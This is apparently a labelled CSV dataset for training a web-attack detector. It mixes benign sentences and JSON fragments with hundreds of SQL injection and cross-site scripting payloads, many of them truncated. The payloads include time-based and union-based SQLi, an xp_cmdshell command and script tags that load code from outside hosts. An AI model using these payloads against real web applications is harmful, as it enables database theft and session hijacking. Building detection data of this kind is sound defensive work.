Payload,Label,text_label,ID
"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171",2,SQLi,19916
"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ",2,SQLi,18941
<track id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,5317
I'm thinking of where to have a family picnic.,0,normal,23831
"<nextid oncontextmenu=""alert(1)"">test</nextid>",1,XSS,4238
/**/or/**/1/**/ = /**/1,2,SQLi,11401
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3050
&#0000060;,1,XSS,9773
"{""id"":null,""firstName"":""Ãâ¦ÃÂ ÃÆÃÂ¢ÃÆÃÂ±"",""lastName"":""",0,normal,27357
<marquee id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,7972
"1"" ) procedure analyse ( extractvalue ( 9627,conca",2,SQLi,15417
"1' ) where 5925 = 5925 union all select null,null,",2,SQLi,19811
"{""id"":null,""firstName"":""Ah Chai"",""lastName"":""Wong""",0,normal,27072
onclick=prompt(8)><svg/onload=prompt(8)>@x.y,1,XSS,345
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10786
<legend id=x tabindex=1 onfocusin=alert(1)></legen,1,XSS,6895
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.,1,XSS,1420
"<wbr oncontextmenu=""alert(1)"">test</wbr>",1,XSS,2579
1' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) ,2,SQLi,14365
"<center onclick=""alert(1)"">test</center>",1,XSS,1823
or 1=1/*,2,SQLi,9901
1' ) ) ) rlike ( select * from ( select ( sleep ( ,2,SQLi,20797
"1"" ) ) or 5356 = ( select count ( * ) from sysuser",2,SQLi,17883
log,0,normal,23211
"1%"" ) ) or 7552 = ( select count ( * ) from rdb$fi",2,SQLi,15394
"<dir onmouseout=""alert(1)"">test</dir>",1,XSS,7391
"{""id"":null,""firstName"":""Yuen"",""lastName"":""Yun"",""sp",0,normal,27288
"end and ( ( ( ""poee"" = ""poee",2,SQLi,14510
-- &password=,2,SQLi,10147
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:sch",1,XSS,1114
"-5591%"" ) ) order by 1--",2,SQLi,15413
Congratulations to our very own @JulienMid and the,0,normal,26506
Where's the missing remote?,0,normal,22574
"-6945' union all select 5063,5063,5063,5063,5063,5",2,SQLi,17100
1' ) ) and 8189 = ( select count ( * ) from sysibm,2,SQLi,12443
"Scroll down and select ""Redeem gift card or promo ",0,normal,25700
<script/src=data&colon;text/j\u0061v\u0061&#115&#9,1,XSS,906
<nextid id=x tabindex=1 ondeactivate=alert(1)></ne,1,XSS,4567
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#4",1,XSS,1054
1' ) ) ) and 6414 = ( select count ( * ) from rdb$,2,SQLi,18432
1'+ ( select 'qpxk' where 7139 = 7139 procedure an,2,SQLi,17184
Select previous.,0,normal,24488
<div onpointerenter=alert(1)>XSS</div>,1,XSS,2548
"<param onpaste=""alert(1)"" contenteditable>test</pa",1,XSS,5147
"-4473' ) union all select 7656,7656#",2,SQLi,21123
"1"" ) union all select null,null,null,null,null,nul",2,SQLi,12756
"<style>@keyframes slidein {}</style><small style=""",1,XSS,5783
1%' ) ) and ( select 9067 from ( select count ( * ,2,SQLi,14934
select ( case when ( 3539 = 8768 ) then 3539 else ,2,SQLi,21698
-4960' ) union all select 5300--,2,SQLi,13525
"1 ) ) union all select null,null,null--",2,SQLi,15567
Select your favorite song.,0,normal,22583
`'><script>\xE2\x80\x86javascript:alert(533)</scri,1,XSS,8980
1'+ ( select ntym where 4750 = 4750,2,SQLi,22469
"<dd ondblclick=""alert(1)"">test</dd>",1,XSS,6656
"UNION SELECT @@VERSION,SLEEP(5),USER(),4#",2,SQLi,10623
-4331 ) as inpx where 9804 = 9804 union all select,2,SQLi,15468
"-4068' ) ) ) union all select 9491,9491,9491--",2,SQLi,16554
"1"" ) and 4386 = utl_inaddr.get_host_address ( chr ",2,SQLi,17404
Select your alternate.,0,normal,25044
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a474",2,SQLi,12761
"-6368' union all select 6529,6529,6529--",2,SQLi,14812
"<data onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,8911
<plaintext id=x tabindex=1 onfocus=alert(1)></plai,1,XSS,2796
ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½,1,XSS,1731
"<sup onkeydown=""alert(1)"" contenteditable>test</su",1,XSS,6695
"-9145%' ) ) ) or make_set ( 9017 = 9368,9368 ) and",2,SQLi,13960
"1' ) ) union all select null,null,null,null,null,n",2,SQLi,18763
"select * from users where id = 1 or @#""{ = 1 or 1 ",2,SQLi,12026
He selected a song to play during the ceremony.,0,normal,23854
1 ) as hlcn where 1165 = 1165 rlike ( select * fro,2,SQLi,13064
"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ",2,SQLi,15476
FALSE,0,normal,23240
<del onpointerleave=alert(1)>XSS</del>,1,XSS,5998
<video onpointerdown=alert(1)>XSS</video>,1,XSS,8678
"<noembed onpaste=""alert(1)"" contenteditable>test</",1,XSS,4445
"1 ) union all select null,null#",2,SQLi,19482
"{""id"":null,""name"":""Skarmory""}",0,normal,26987
<body onafterprint=alert(1)>,1,XSS,48
"<style onLoad style onLoad=""javascript:javascript:",1,XSS,386
"<option onclick=""alert(1)"">test</option>",1,XSS,3693
"<style>@keyframes slidein {}</style><pre style=""an",1,XSS,6915
<style>:target {color:red;}</style><samp id=x styl,1,XSS,8357
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,SQLi,10744
<xss onpointerout=alert(1) style=display:block>XSS,1,XSS,91
select pg_sleep ( 5 ) and ( ( 'vxxg' = 'vxxg,2,SQLi,15151
end and ( ( 6874 = 6874,2,SQLi,14081
Select a scent for the candle.,0,normal,24001
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,16644
"{""id"":null,""firstName"":""Aini"",""lastName"":""Md Yusof",0,normal,27152
"<picture onbeforecut=""alert(1)"" contenteditable>te",1,XSS,4354
1'+ ( select rdwb where 2498 = 2498 and 3429 = 763,2,SQLi,17237
1 ) ) as cusv where 4871 = 4871 and elt ( 1210 = 1,2,SQLi,12787
"<style>@keyframes slidein {}</style><input style=""",1,XSS,7050
1' ) ) and ( 7517 = 3423 ) *3423 and ( ( 'aenz' = ,2,SQLi,21235
"-2314"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ",2,SQLi,18554
"<noframes oncopy=""alert(1)"" contenteditable>test</",1,XSS,8462
"1"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( ",2,SQLi,18840
"1"" ) ) ) rlike ( select * from ( select ( sleep ( ",2,SQLi,19104
<style>:target {transform: rotate(180deg);}</style,1,XSS,5366
"1%"" and 9198 = 9198--",2,SQLi,14375
"{""id"":null,""firstName"":""Jerome"",""lastName"":""Tan"",""",0,normal,27564
"{""id"":null,""firstName"":""Sakinah"",""lastName"":""Ali"",",0,normal,27101
"1%' ) ) ) or row ( 1045,7562 ) > ( select count ( ",2,SQLi,12233
1' ) ) and 7533 = 7533 and ( ( 'pagc' like 'pagc,2,SQLi,18284
<script\x00>javascript:alert(1)</script>,1,XSS,607
In choosing his collaborators his principle was ne,0,normal,26012
Where's the ski resort?,0,normal,23609
-3136%' ) or 3400 = 6002,2,SQLi,18989
Up to 20% off select Sun Joe Outdoor Power Equipme,0,normal,25220
1' ) ) as wdor where 7426 = 7426,2,SQLi,19839
Create a captivating story.,0,normal,22626
"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d45715",2,SQLi,12304
"<area onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,8679
"<bdi onmousemove=""alert(1)"">test</bdi>",1,XSS,3727
""" ) ) ;waitfor delay '0:0:__TIME__'--",2,SQLi,11986
"<textarea draggable=""true"" ondragstart=""alert(1)"">",1,XSS,2783
"<sub onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,2858
1'|| ( select 'dajl' from dual where 8440 = 8440,2,SQLi,14801
"1',iif ( 4861 = 6268,1,1/0 )",2,SQLi,21950
"1"" ) ) as dshc where 9911 = 9911 or 1022 = ( selec",2,SQLi,14342
"<html onMouseDown html onMouseDown=""javascript:jav",1,XSS,397
"1 and make_set ( 8403 = 8403,8899 )",2,SQLi,14889
1' where 4795 = 4795 and 4595 = 4595#,2,SQLi,12464
1' ) ) and ( select * from ( select ( sleep ( 5 ) ,2,SQLi,15832
"{""id"":null,""name"":""Clefairy""}",0,normal,27548
"-9829' ) ) ) or 1 group by concat ( 0x7171706a71, ",2,SQLi,17881
1' ) where 1363 = 1363,2,SQLi,12559
"1 where 8045 = 8045 union all select null,null,nul",2,SQLi,15986
-2516 ) where 3349 = 3349 or 4855 = 1806--,2,SQLi,21866
<label onpointerdown=alert(1)>XSS</label>,1,XSS,3701
1' and exp ( ~ ( select * from ( select concat ( 0,2,SQLi,15282
-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ,2,SQLi,13717
1'|| ( select 'sned' where 4957 = 4957 and 9254 = ,2,SQLi,15043
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,21708
1' where 7828 = 7828 or 4240 = ( select 4240 from ,2,SQLi,15914
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""",1,XSS,301
The chain's also testing out some new drinks in se,0,normal,25477
"<ul draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,4683
"Ebates, mentioned above, gives you a percentage of",0,normal,26217
"or 1""=""1""/*",2,SQLi,9989
"<menu draggable=""true"" ondragstart=""alert(1)"">test",1,XSS,7557
where,0,normal,26528
select ( case when ( 4572 = 4086 ) then 1 else 457,2,SQLi,13097
"<table onkeydown=""alert(1)"" contenteditable>test</",1,XSS,4396
"<xmp onclick=""alert(1)"">test</xmp>",1,XSS,6951
They select top candidates.,0,normal,24435
"-7845' union all select 9574,9574,9574,9574,9574,9",2,SQLi,14079
<STYLE>@import'%(css)s';</STYLE>,1,XSS,753
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",1,XSS,742
Filter the bright photos.,0,normal,22635
1 ) ) and 8189 = ( select count ( * ) from sysibm.,2,SQLi,18744
"When you select bath towels, consider the color an",0,normal,25146
"{""id"":null,""firstName"":""Elisa"",""lastName"":""Mak"",""s",0,normal,26990
"<footer onmouseleave=""alert(1)"">test</footer>",1,XSS,7356
"1"" ) ) as wnzf where 3352 = 3352 or char ( 117 ) |",2,SQLi,15744
"x=""&quot;,alert(1)//"";",1,XSS,9400
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10426
1 ) ) as vzso where 8541 = 8541 or ( select 2* ( i,2,SQLi,18335
1,0,normal,26647
"{""id"":14217,""firstName"":""jmeter"",""lastName"":""jmete",0,normal,26810
"-2717"" or 1 group by concat ( 0x7171706a71, ( sele",2,SQLi,19227
"{""id"":null,""name"":""Peckmon""}",0,normal,26952
Where's the canyon?,0,normal,23522
-7194'|| ( select 'gbrx' from dual where 6205 = 62,2,SQLi,15247
"<IFRAME SRC=""javascript:document.vulnerable=true;""",1,XSS,1500
Supreme Court Justice Antonin Scalia has given som,0,normal,25512
select,0,normal,26553
"-9408%"" ) ) union all select 1841,1841,1841,1841,1",2,SQLi,22331
select * from users where id = 1 or $+<1 union sel,2,SQLi,11477
"1%' ) union all select null,null,null,null#",2,SQLi,15344
1' ) ) as xirr where 2425 = 2425,2,SQLi,18658
1 ) ) as zdbj where 2300 = 2300 ( select ( case wh,2,SQLi,14792
1 and 9198 = 9198--,2,SQLi,18358
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)",1,XSS,554
-2679' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlha,2,SQLi,20169
"1"" ) where 4520 = 4520",2,SQLi,21762
"1%"" and row ( 6237,7469 ) > ( select count ( * ) ,",2,SQLi,14124
"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,13575
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10678
"In either theory, conscience may be understood as ",0,normal,26010
"end and ( ( ""%"" = """,2,SQLi,12415
<discard onpointerout=alert(1)>XSS</discard>,1,XSS,8244
"A select few, however, don't waste their time with",0,normal,26418
1 where 3175 = 3175 or 8421 = ( select count ( * ),2,SQLi,18472
onmouseover%3dprompt(941634),1,XSS,9742
-4085'+ ( select aipn where 5493 = 5493 union all ,2,SQLi,12976
"<script oncut=""alert(1)"" contenteditable>test</scr",1,XSS,2701
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76",2,SQLi,21118
><script src=//brutelogic.com.br&sol;1.js&num;,1,XSS,9684
"<code onpaste=""alert(1)"" contenteditable>test</cod",1,XSS,5009
"1%"" ) ) or row ( 1045,7562 ) > ( select count ( * ",2,SQLi,16575
Randomly select a wedding favor.,0,normal,24405
<tfoot onpointerenter=alert(1)>XSS</tfoot>,1,XSS,6463
"<img\x47src=x onerror=""javascript:alert(1)"">",1,XSS,656
<style>:target {color: red;}</style><td id=x style,1,XSS,2955
<figcaption onpointermove=alert(1)>XSS</figcaption,1,XSS,3583
Select the optimal temperature for comfort.,0,normal,24042
"1%"" and 5556 = ( select count ( * ) from all_users",2,SQLi,15113
"1' ) where 7640 = 7640 and make_set ( 8978 = 8594,",2,SQLi,14940
"<frame onmouseover=""alert(1)"">test</frame>",1,XSS,7412
"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'u",2,SQLi,16045
<style>:target {color:red;}</style><listing id=x s,1,XSS,4755
"<head draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,3405
"<style>@keyframes x{}</style><noframes style=""anim",1,XSS,6451
<img src=xss onerror=alert(1)>,1,XSS,929
He decided to join the yoga class next week.,0,normal,22904
"{""id"":null,""firstName"":""Boon"",""lastName"":""Lee"",""sp",0,normal,26847
"{""id"":null,""firstName"":""Ong"",""lastName"":""Guang"",""a",0,normal,26889
1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ,2,SQLi,15680
"{""id"":null,""name"":""leader""}",0,normal,27062
ORDER BY 4#,2,SQLi,10277
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript",1,XSS,477
"-5322"" union all select 6494,6494,6494,6494,6494,6",2,SQLi,18479
select,0,normal,26570
; exec master..xp_cmdshell 'ping 172.10.1.255'--,2,SQLi,10094
"<style>@keyframes x{}</style><caption style=""anima",1,XSS,3658
<audio id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,7484
"1"" ) where 2873 = 2873 or 7417 = ( select count ( ",2,SQLi,20637
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5037
Insert your contact information in the form.,0,normal,22922
"{""id"":null,""firstName"":""Sheryl"",""lastName"":""Lee"",""",0,normal,27273
"iif ( 1718 = 5436,1,1/0 )",2,SQLi,20951
"1"" ) where 7578 = 7578 and 6414 = ( select count (",2,SQLi,16466
Sort results where necessary.,0,normal,23327
"-2048 ) ) union all select 7054,7054,7054,7054,705",2,SQLi,14474
Note: The additional savings is only good for sele,0,normal,25864
1'|| ( select 'xsoq' from dual where 6690 = 6690 a,2,SQLi,14374
<input onpointermove=alert(1)>XSS</input>,1,XSS,1920
Open Settings on your iPhone or iPad Search for th,0,normal,25815
"<progress onmousemove=""alert(1)"">test</progress>",1,XSS,7810
"-9937' ) ) union all select 3900,3900,3900,3900,39",2,SQLi,19740
"1"" and 3707 = ( select count ( * ) from sysibm.sys",2,SQLi,17514
"-7528' or make_set ( 3809 = 1821,1821 ) and 'kgch'",2,SQLi,14698
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,8646
<input2 onpointerover=alert(1)>XSS</input2>,1,XSS,6235
1' ) ) ) and 6537 = dbms_pipe.receive_message ( ch,2,SQLi,12474
"{""id"":null,""name"":""paint itself""}",0,normal,27592
"-6155%' ) ) union all select 2421,2421,2421,2421,2",2,SQLi,18890
<IMG SRC=javascript:javascript:alert(1)>,1,XSS,734
1' ) as cgsz where 7194 = 7194 and extractvalue ( ,2,SQLi,15950
"1"" or 6979 = like ( 'abcdefg',upper ( hex ( random",2,SQLi,14881
"<iframe onkeydown=""alert(1)"" contenteditable>test<",1,XSS,8302
AND 7506=9091 AND (5913=5913,2,SQLi,10224
I'm considering where to take a photography class.,0,normal,23884
( select ( case when ( 3592 = 3592 ) then 3592 els,2,SQLi,15661
"1"" ) ) and elt ( 6553 = 4771,4771 ) and ( ( ""eolu""",2,SQLi,16369
") AND ELT(1337=1337,SLEEP(5))-- 1337",2,SQLi,11246
"1%' ) ) and updatexml ( 3393,concat ( 0x2e,0x71717",2,SQLi,21811
<b onpointerleave=alert(1)>XSS</b>,1,XSS,3482
OR x=y--,2,SQLi,10208
Select goods.,0,normal,24555
"<option draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,8117
"1' ) ) ) union all select null,null,null,null#",2,SQLi,20041
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,10983
Where's the chiropractor?,0,normal,23631
select case when 3995 = 8680 then 1 else null end-,2,SQLi,21848
"On the top right, select the cog wheel (""Settings""",0,normal,25837
"1' ) as tygi where 9891 = 9891 and row ( 6237,7469",2,SQLi,17038
"-5672%"" or 3825 = 9675--",2,SQLi,13520
"1"" ) ) as ogzn where 6849 = 6849 and 3580 = ( sele",2,SQLi,14794
The extraordinary patience requisite to a successf,0,normal,25452
<svg><noembed onload=alert(1)></noembed>,1,XSS,7207
Modify the privacy controls.,0,normal,22744
-2452' ) ) ) union all select 1951--,2,SQLi,14428
That's why I select places like Washington Heights,0,normal,25489
"<u onclick=""alert(1)"">test</u>",1,XSS,3637
They can't select where these features populate on,0,normal,25314
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)><,1,XSS,2508
<data id=x tabindex=1 onbeforeactivate=alert(1)></,1,XSS,7342
Delete the cookies.,0,normal,22858
"<tbody onpaste=""alert(1)"" contenteditable>test</tb",1,XSS,2921
"<colgroup draggable=""true"" ondragend=""alert(1)"">te",1,XSS,2786
Modify the privacy policy for compliance.,0,normal,22981
"<datalist oncut=""alert(1)"" contenteditable>test</d",1,XSS,3529
1' ) where 6842 = 6842,2,SQLi,18529
1' or 8421 = ( select count ( * ) from generate_se,2,SQLi,17506
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8877
<style>:target {transform: rotate(180deg);}</style,1,XSS,5321
"{""id"":null,""name"":""Gible""}",0,normal,27417
1' where 9420 = 9420 and 8189 = ( select count ( *,2,SQLi,16203
<strike id=x tabindex=1 onbeforedeactivate=alert(1,1,XSS,5262
") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 13",2,SQLi,11260
select * from users where id = '1' *1 union select,2,SQLi,12031
waitfor delay '0:0:5' and ( ( 'yjsp' like 'yjsp,2,SQLi,16501
"-6496"" ) as obnf where 2903 = 2903 or make_set ( 9",2,SQLi,14941
"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x71717",2,SQLi,12915
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1,XSS,853
"1' ) procedure analyse ( extractvalue ( 5840,conca",2,SQLi,12662
"<col ondblclick=""alert(1)"">test</col>",1,XSS,7715
<svg><picture onload=alert(1)></picture>,1,XSS,6718
or 'x'='x,2,SQLi,9892
"1%"" ) ) rlike ( select ( case when ( 7689 = 7689 )",2,SQLi,13311
<animatetransform onpointerover=alert(1)>XSS</anim,1,XSS,2494
"-7746' ) union all select 1998,1998,1998,1998,1998",2,SQLi,14909
"{""id"":null,""name"":""railroad""}",0,normal,27299
"<style>@keyframes slidein {}</style><a style=""anim",1,XSS,3572
-8684' where 9820 = 9820 or 6844 = 5105,2,SQLi,15871
"<bgsound onclick=""alert(1)"">test</bgsound>",1,XSS,2949
"-1598 ) ) ) union all select 9418,9418,9418,9418,9",2,SQLi,16724
Modify the account information.,0,normal,22709
1' ) or sleep ( 5 ),2,SQLi,15012
But the fibre produced by these rapid and economic,0,normal,26305
A look at select films screening at the Sundance F,0,normal,26437
"select count ( * ) from domain.domains as t1,domai",2,SQLi,16601
<bdo onpointerdown=alert(1)>XSS</bdo>,1,XSS,1881
Where did you find that charming cafÃÂ©?,0,normal,23770
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,18978
1 where 7051 = 7051 or 4411 = ( select count ( * ),2,SQLi,12305
1%' and 1736 = 4220,2,SQLi,14697
"-1917"" ) or 8571 = 8571--",2,SQLi,15604
"Simply add the items you want, select the most app",0,normal,25551
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,7491
[color=red width=expression(alert(123))][color],1,XSS,1323
AND 1 = utl_inaddr.get_host_address ( ( SELECT COU,2,SQLi,12037
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,1749
<style>:target {transform: rotate(180deg);}</style,1,XSS,8149
1,0,normal,26681
<image id=x tabindex=1 onbeforedeactivate=alert(1),1,XSS,6750
-1602' or 3038 = 3038,2,SQLi,17627
1'+ ( select vlut where 9517 = 9517 union all sele,2,SQLi,13294
"1' ) where 9091 = 9091 union all select null,null,",2,SQLi,19156
"-5898"" ) ) as fycd where 7135 = 7135 or 1570 = con",2,SQLi,21723
1%' ) ) ) and 6969 = ( select 6969 from pg_sleep (,2,SQLi,18173
1'+ ( select 'iify' where 6257 = 6257 or 6793 = ( ,2,SQLi,16336
